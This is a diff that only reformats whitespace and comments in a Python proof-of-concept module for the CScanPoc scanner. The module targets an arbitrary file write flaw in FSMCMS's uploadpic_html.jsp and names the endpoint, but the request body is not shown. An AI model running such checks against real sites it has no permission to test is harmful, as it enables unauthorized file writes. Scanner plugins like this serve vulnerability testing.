@@ -4,11 +4,12 @@ from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import urlparse
 
+
 class Vuln(ABVuln):
-    vuln_id = 'FSMCMS_0005' # 平台漏洞编号，留空
+    vuln_id = 'FSMCMS_0005'  # 平台漏洞编号，留空
     name = 'FSMCMS系统 任意文件写入'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.OTHER # 漏洞类型
+    type = VulnType.OTHER  # 漏洞类型
     disclosure_date = '2015-10-10'  # 漏洞公布时间
     desc = '''
         北京东方文辉FSMCMS /cms/client/uploadpic_html.jsp 可写入任意文件。
@@ -18,6 +19,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = 'FSMCMS'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '1e94429f-1f6c-4c79-934e-746d9a748b31'
@@ -31,8 +33,8 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            #ref http://www.wooyun.org/bugs/wooyun-2015-0144274/
+
+            # ref http://www.wooyun.org/bugs/wooyun-2015-0144274/
             hh = hackhttp.hackhttp()
             arr = urlparse.urlparse(self.target)
             raw = '''
@@ -68,6 +70,7 @@ test_vul
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
